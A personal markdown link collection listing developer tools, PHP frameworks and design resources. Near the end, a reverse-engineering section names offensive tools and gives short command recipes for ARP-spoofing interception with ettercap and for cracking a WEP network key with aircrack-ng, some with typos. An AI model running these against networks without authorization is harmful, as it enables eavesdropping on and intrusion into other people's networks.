# Links

awesome people:
- https://twitter.com/ajlkn is a skillful designer  
- https://github.com/spatie is a php agency producing high quality & widely used packages  
- https://codeblog.jonskeet.uk/ was an architect at c#
- https://www.joelonsoftware.com/ founded stackoverflow

tools:
- http://https//notepad-plus-plus.org/ as a fast editor for windows
- http://www.visualstudio.com/ as a C# IDE for windows
- http://www.jetbrains.com/ as an IDE for all platforms
- http://code.visualstudio.com/ as an editor for all platforms
- http://www.sublimetext.com/ as another editor

mobile frameworks:
- http://cordova.apache.org/
- http://ionicframework.com/

static analysis:
- http://fbinfer.com/
- https://flow.org/

basic tools:
- ninite.com
- easeus partition master
- windirstat
- speccy
- httptrack

username:
- https://knowem.com/checksocialnames.php
- https://checkusernames.com/
- https://iwantmyname.com/

visualizations:
- https://gource.io/ for git
- https://insights.stackoverflow.com for technologies

## php

resources:
- http://www.phptherightway.com/

frameworks:
- http://symfony.com/
- http://www.slimframework.com/
- http://laravel.com/
- http://cakephp.org/

## C#

compilers:
- https://www.xamarin.com/

## Frontend

- https://tympanus.net/codrops/

## reverse engineering

hashes:
- http://crackstation.net/

toolkits:
- http://www.exploit-db.com/
- https://www.kali.org/
- https://www.metasploit.com/

programs:
- Reflector & FileDissassembler (dissassemble .NET)
- IDA Pro
- netcut/tuxcut
- no-ip DUC
- cheatengine
- firesheep
- Cain & Abel
- SMAC 2.7
- colasoft mac scanner pro
- wireshark
- John the Ripper
- winpccap

ettercap:
- configure `etter.conf` (UID = 0, GID = 0, exclude iptables)
- `ettercap -T -Q -M arp:remote -i <wlandevice>`
- `urlsnarf -i <wlandevice>`

aircrack:
- `airmon-ng check kill` to finishes all processes that may interfer
- `airmon-ng start <wlandevice>` to generate new virtual monitordevice
- `airdoump-ng <monitordevice>` to dump all incoming packages
- `airodump-ng -w wep -c <channel> --bssid <macadress> <monitordevice>` to connect to the target network
- `aireplay-ng -3 -a <macadress> <monitordevice>` to generate additional traffic
- `aireplay-ng -1 0 -b <macadress> <monitormode>` to capture ARP packets and generate even more traffic
- `ls` to find name of the `.cap` file with the collected traffic
- `aircrack-ng <packetname>` to decrypt the key

pentesting:
- http://www.enigmagroup.org/
- https://www.hackthissite.org/
- http://www.happy-security.de/